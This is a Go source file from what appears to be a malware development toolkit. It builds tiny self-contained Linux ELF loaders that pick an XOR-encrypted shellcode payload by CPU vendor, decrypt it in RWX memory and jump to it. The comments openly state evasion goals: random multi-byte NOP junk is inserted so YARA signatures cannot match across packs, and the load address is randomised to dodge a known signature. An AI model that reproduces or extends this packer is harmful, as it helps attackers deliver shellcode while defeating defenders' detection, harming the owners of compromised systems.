package packer

import (
	"encoding/binary"
	"fmt"
	mathrand "math/rand"

	"github.com/oioio-space/maldev/pe/packer/transform"
	"github.com/oioio-space/maldev/random"
)

// Bundle-as-executable: minimal stub asm + minimal ELF wrapper. The
// produced binary is a few hundred bytes total — no Go runtime, no
// dynamic linker, no on-disk plaintext for the matching payload until
// it gets XOR-decrypted into the stub's own page (which is RWX) at
// startup.
//
// This sits next to the higher-level `cmd/bundle-launcher` Go-runtime
// approach (~5 MB binary, full Go runtime + memfd+execve dispatch).
// The all-asm path trades operator ergonomics (no Negate flag in
// the asm evaluator yet) for binary size and OPSEC.

// intelNops are the Intel-recommended multi-byte NOP encodings (SDM
// Vol 2B, NOP §). Using these instead of N×0x90 means a yara writer
// can't pattern-match on long 0x90 runs to spot junk insertion.
//
// Each entry is one NOP of length [index+1]. The 9-byte version uses
// the maximum recommended single-NOP encoding.
var intelNops = [][]byte{
	{0x90},                                                       // 1: nop
	{0x66, 0x90},                                                 // 2: 66 nop
	{0x0f, 0x1f, 0x00},                                           // 3: nop dword [rax]
	{0x0f, 0x1f, 0x40, 0x00},                                     // 4: nop dword [rax+0]
	{0x0f, 0x1f, 0x44, 0x00, 0x00},                               // 5: nop dword [rax+rax+0]
	{0x66, 0x0f, 0x1f, 0x44, 0x00, 0x00},                         // 6
	{0x0f, 0x1f, 0x80, 0x00, 0x00, 0x00, 0x00},                   // 7
	{0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},             // 8
	{0x66, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00},       // 9
}

// junkInsertOffset is the byte position WITHIN the stub bytes where
// the polymorphic junk gets inlined — between the PIC trampoline
// (call/pop/add r15, imm32 — 14 bytes) and the CPUID prologue.
//
// Why this slot is safe: every Jcc displacement in the stub is rel8
// relative to the end-of-Jcc address; both the source AND target of
// every Jcc live AFTER junkInsertOffset, so inserting N bytes shifts
// both by the same N — disp = (target+N) - (end-of-Jcc+N) is
// invariant. The PIC's `add r15, imm32` immediate is independently
// patched at wrap time to the new total stub length minus 5, so the
// junk simply lands inside the bundle-base computation.
const junkInsertOffset = 14

// injectStubJunk returns a copy of `stub` with a random number of
// Intel-recommended NOP bytes spliced in at [junkInsertOffset]. The
// total inserted byte count is in [4, 32) — enough to perturb yara
// signatures across packs without bloating the wrapped binary.
//
// `r` drives the choice of NOP sizes and the total length, so caller
// supplying the same seed gets the same junk (test determinism).
// Production callers in [WrapBundleAsExecutableLinuxWith] use
// crypto/rand for the seed so two packs of the same bundle produce
// distinct stub byte sequences.
func injectStubJunk(stub []byte, r *mathrand.Rand) []byte {
	if r == nil {
		return append([]byte(nil), stub...)
	}
	target := 4 + r.Intn(28) // [4, 32)
	junk := make([]byte, 0, target)
	for len(junk) < target {
		remaining := target - len(junk)
		maxSize := remaining
		if maxSize > len(intelNops) {
			maxSize = len(intelNops)
		}
		size := 1 + r.Intn(maxSize)
		junk = append(junk, intelNops[size-1]...)
	}
	out := make([]byte, 0, len(stub)+len(junk))
	out = append(out, stub[:junkInsertOffset]...)
	out = append(out, junk...)
	out = append(out, stub[junkInsertOffset:]...)
	return out
}


// bundleOffsetImm32Pos is the byte offset of the patchable imm32
// inside the bundle stub bytes — i.e. the "BUNDLE_OFF"
// operand of `add r15, imm32`. Exposed so tests + the wrap helper
// agree on the layout.
const bundleOffsetImm32Pos = 10

// WrapBundleAsExecutableLinux composes a runnable Linux x86-64 ELF
// from a bundle blob. Layout:
//
//	[ELF Ehdr (64 B) | PT_LOAD Phdr (56 B) | stub asm (~160 B) | bundle blob]
//
// Steps:
//
//  1. Emit the vendor-aware stub (PIC trampoline + CPUID prologue +
//     fingerprint scan loop + per-entry vendor compare + XOR decrypt
//     + JMP to payload).
//  2. Splice random Intel multi-byte NOPs at slot A (between PIC and
//     CPUID prologue) for per-pack stub polymorphism — see
//     [injectStubJunk].
//  3. Patch the stub's `add r15, BUNDLE_OFF` immediate with the byte
//     distance from the .pic label (5 bytes into the stub) to the
//     bundle's first byte. Equivalent to `len(stub) - 5`.
//  4. Concatenate stub + bundle.
//  5. Wrap in [transform.BuildMinimalELF64WithVaddr], using
//     `profile.Vaddr` when set.
//
// The result is a self-contained ELF — no PT_INTERP, no DT_NEEDED, no
// imports. The kernel maps it RWX and jumps to entry; the stub
// resolves the bundle base via call/pop PIC, walks the
// FingerprintEntry table dispatching on PT_MATCH_ALL or
// PT_CPUID_VENDOR with a 12-byte CPUID compare (all-zero VendorString
// = wildcard), XOR-decrypts the matched payload's data in place, and
// JMPs to it. The decrypted bytes must therefore be raw
// position-independent shellcode (NOT a packed PE/ELF — those need
// the cmd/bundle-launcher reflective path).
//
// Today's gap: the asm evaluator does not honour the Negate flag yet
// (Go-side [SelectPayload] does); a future minor closes that.
// PT_WIN_BUILD is also Linux-stub-skipped since hostWinBuild=0 there.
func WrapBundleAsExecutableLinux(bundle []byte) ([]byte, error) {
	return WrapBundleAsExecutableLinuxWith(bundle, BundleProfile{})
}

// WrapBundleAsExecutableLinuxWith is the per-build-profile-aware
// variant of [WrapBundleAsExecutableLinux]. Validates the supplied
// bundle's magic against `profile.Magic` (canonical default when
// zero) before wrapping. The bundle stub asm itself reads only
// header offsets — count, fpTable, plTable — and is magic-agnostic,
// so per-build magic bytes pass through transparently.
//
// Polymorphism: each call splices a fresh batch of Intel multi-byte
// NOPs into the stub (between the PIC trampoline and the CPUID
// prologue) so two packs of the same bundle produce distinct stub
// byte sequences — yara writers cannot signature the 160-byte stub
// across packs. The seed is drawn from crypto/rand. For deterministic
// pack output (testing, reproducible builds) use
// [WrapBundleAsExecutableLinuxWithSeed].
func WrapBundleAsExecutableLinuxWith(bundle []byte, profile BundleProfile) ([]byte, error) {
	seed, err := random.Int64()
	if err != nil {
		return nil, fmt.Errorf("packer: stub junk seed: %w", err)
	}
	return WrapBundleAsExecutableLinuxWithSeed(bundle, profile, seed)
}

// WrapBundleAsExecutableLinuxWithSeed is the deterministic variant
// of [WrapBundleAsExecutableLinuxWith]: same seed → same stub junk
// pattern → byte-identical wrapped output (modulo the random per-
// payload XOR keys, which the caller controls via
// BundleOptions.FixedKey upstream). Use seed=0 for the canonical
// junk-free shape.
func WrapBundleAsExecutableLinuxWithSeed(bundle []byte, profile BundleProfile, seed int64) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < BundleHeaderSize %d",
			ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != expected {
		return nil, fmt.Errorf("%w: %#x != %#x",
			ErrBundleBadMagic, magic, expected)
	}

	// Use the vendor-aware scan stub: walks the FingerprintEntry table,
	// V2-Negate scan stub (v0.88.0+): Builder-driven emission with
	// FingerprintPredicate.Negate flag operational. Matches entries
	// by PT_MATCH_ALL bit OR PT_CPUID_VENDOR with a 12-byte host
	// CPUID compare (all-zero VendorString = wildcard), then XORs
	// the per-entry negate byte into the match accumulator before
	// branching. On no match, sys_exit_group(0).
	//
	// PT_WIN_BUILD remains Linux-no-op (host build = 0); the Windows
	// wrap uses `bundleStubV2NegateWinBuildWindows` which reads the
	// PEB and applies the range check.
	bRng, aRng := splitSeedRngs(seed)
	stub, _, err := bundleStubVendorAwareV2NegateRng(bRng)
	if err != nil {
		return nil, fmt.Errorf("packer: V2-Negate stub: %w", err)
	}
	// Slot A — post-Encode byte splice at offset 14 (after PIC
	// trampoline, before CPUID prologue). All Jcc displacements
	// are AFTER this slot, so they remain valid; the PIC's
	// bundleOff immediate is recomputed below.
	if aRng != nil {
		stub = injectStubJunk(stub, aRng)
	}
	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)

	combined := make([]byte, 0, len(stub)+len(bundle))
	combined = append(combined, stub...)
	combined = append(combined, bundle...)

	// Per-build Vaddr (when set) randomises the canonical 0x400000
	// load address — yara'able as 'tiny ELF at standard ld base'.
	// Zero falls back to MinimalELF64Vaddr inside BuildMinimalELF64WithVaddr.
	return transform.BuildMinimalELF64WithVaddr(combined, profile.Vaddr)
}
